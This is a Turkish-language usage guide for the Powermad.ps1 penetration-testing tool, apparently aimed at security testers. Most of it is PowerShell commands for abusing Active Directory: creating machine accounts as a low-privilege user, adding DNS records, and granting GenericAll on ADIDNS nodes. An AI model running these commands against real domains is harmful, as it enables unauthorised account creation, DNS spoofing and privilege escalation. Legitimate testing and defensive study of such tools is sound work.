# Powermad.ps1 Kullanım Kılavuzu

## Giriş
Powermad.ps1, Active Directory ortamında MachineAccountQuota ve DNS zafiyetlerini istismar etmek için kullanılan bir PowerShell aracıdır. Bu araç, özellikle düşük yetkili kullanıcıların etki alanına yeni makine hesapları eklemesi veya DNS kayıtlarıyla manipülasyon yapmasına olanak tanır.

Bu kılavuz, Powermad.ps1 aracını kullanarak temel işlemleri gerçekleştirme yöntemlerini adım adım açıklar.

---

## Gereksinimler
- Windows sistem
- PowerShell
- Active Directory ortamına erişim
- Betik çalıştırma kısıtlamalarını bypass etme yetkisi

---

## Özellikler
Powermad.ps1 aşağıdaki işlemleri gerçekleştirebilir:
- **MachineAccountQuota İşlemleri:** Yeni makine hesapları oluşturma, mevcut hesapları yönetme veya silme
- **DNS İşlemleri:** Active Directory Entegre DNS (ADIDNS) yapılandırmalarını manipüle etme
- **Dinamik Güncellemeler:** DNS kayıtlarını ekleme veya silme
- **ACL Yönetimi:** DNS düğümleri üzerinde erişim kontrol listelerini (ACL) değiştirme

---

## Kullanım

### 1. **Powermad.ps1 Betiğini Çalıştırma**
#### Betiğin İndirilmesi
Powermad.ps1'i indirerek kullanabilirsiniz:
```powershell
Invoke-WebRequest -Uri https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1 -OutFile Powermad.ps1
```

#### Betiğin Yüklenmesi
PowerShell oturumunuza betiği yüklemek için:
```powershell
Import-Module .\Powermad.ps1
```

### 2. **MachineAccountQuota İşlemleri**
#### Yeni Makine Hesabı Oluşturma
Etki alanına yeni bir makine hesabı eklemek için:
```powershell
New-MachineAccount -MachineAccount test -Password P@ssw0rd123
```
- **MachineAccount**: Yeni makine hesabının adı.
- **Password**: Hesap için belirlenen parola.

#### Mevcut Hesapları Yönetme
Bir makine hesabını devre dışı bırakmak için:
```powershell
Disable-MachineAccount -MachineAccount test
```
Bir makine hesabını yeniden etkinleştirmek için:
```powershell
Enable-MachineAccount -MachineAccount test
```

#### Makine Hesabı Silme
Bir makine hesabını silmek için:
```powershell
Remove-MachineAccount -MachineAccount test -Credential $domainadmin
```
- **Credential**: Yüksek ayrıcalıklı bir kullanıcı kimlik bilgisi.

### 3. **DNS İşlemleri**
#### Yeni DNS Kaydı Eklemek
Bir DNS kaydı eklemek için:
```powershell
Invoke-DNSUpdate -DNSType A -DNSName www -DNSData 192.168.1.100
```
- **DNSType**: Kaydın türü (ör. A, CNAME, SRV).
- **DNSName**: Kaydın adı.
- **DNSData**: Kaydın verisi (ör. IP adresi).

#### DNS Kaydı Silme
Bir DNS kaydını silmek için:
```powershell
Invoke-DNSUpdate -DNSType A -DNSName www.test.local -Action Delete
```

### 4. **ACL Yönetimi**
#### DNS Düğümü Erişim İzinlerini Görüntüleme
Bir DNS düğümünün erişim kontrol listesini (DACL) görmek için:
```powershell
Get-ADIDNSPermission -Node www
```

#### Erişim İzni Verme
Bir DNS düğümüne erişim izni eklemek için:
```powershell
Grant-ADIDNSPermission -Node www -Principal "Authenticated Users" -Access GenericAll
```

#### Erişim İzni Kaldırma
Bir DNS düğümünden erişim iznini kaldırmak için:
```powershell
Revoke-ADIDNSPermission -Node www -Principal "Authenticated Users" -Access GenericAll
```

---

## Örnek Senaryo
Bir Active Directory ortamında DNS manipülasyonu yapmayı denediğinizi varsayalım:

1. **Yeni DNS Kaydı Eklemek:**
   ```powershell
   Invoke-DNSUpdate -DNSType A -DNSName api -DNSData 10.0.0.5
   ```

2. **Erişim İzinlerini Güncellemek:**
   ```powershell
   Grant-ADIDNSPermission -Node api -Principal "Authenticated Users" -Access GenericAll
   ```

3. **Makine Hesabı Oluşturmak:**
   ```powershell
   New-MachineAccount -MachineAccount TestMachine -Password SecureP@ssw0rd
   ```

---

## Güvenlik Notları
Powermad.ps1 yalnızca yasal ve etik amaçlarla kullanılmalıdır. Araç, yalnızca sistem yöneticilerinin güvenlik açıklarını tespit etmesine ve gidermesine yardımcı olmak için tasarlanmıştır. Yetkisiz kullanım yasal sonuçlara yol açabilir.

---

## Kaynaklar
- [Powermad.ps1 GitHub](https://github.com/Kevin-Robertson/Powermad)
- [Resmi Belgeler ve Wiki](https://github.com/Kevin-Robertson/Powermad/wiki)

---

Bu rehber, Powermad.ps1 betiğini kullanarak Active Directory ortamında makine hesapları ve DNS manipülasyonları yapmanın temellerini kapsamaktadır. Daha fazla bilgi veya yardım için GitHub sayfasını ziyaret edin.
